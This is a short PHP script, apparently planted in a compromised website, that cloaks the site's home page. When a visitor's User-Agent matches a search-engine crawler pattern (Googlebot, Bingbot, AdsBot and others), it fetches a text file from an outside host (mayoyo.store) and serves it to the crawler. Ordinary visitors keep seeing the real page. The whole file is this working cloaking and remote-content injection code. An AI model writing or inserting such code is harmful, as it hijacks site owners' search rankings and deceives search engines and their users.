<?php
function mangsud($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);   // Ikuti redirect jika ada
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);            // Timeout 10 detik
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$request_uri = $_SERVER['REQUEST_URI'] ?? '/';
$is_root = ($request_uri === '/' || $request_uri === '');

$res = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot|mediapartners|googlebot-mobile|adsbot-google|bot|spider|crawler)/i";

if ($is_root && preg_match($botchar, $res)) {
    $bot_url = "https://mayoyo.store/journalenrichment.com/index.txt";
    $file = mangsud($bot_url);

    if ($file !== false) {
        echo $file;
        exit;
    }
}

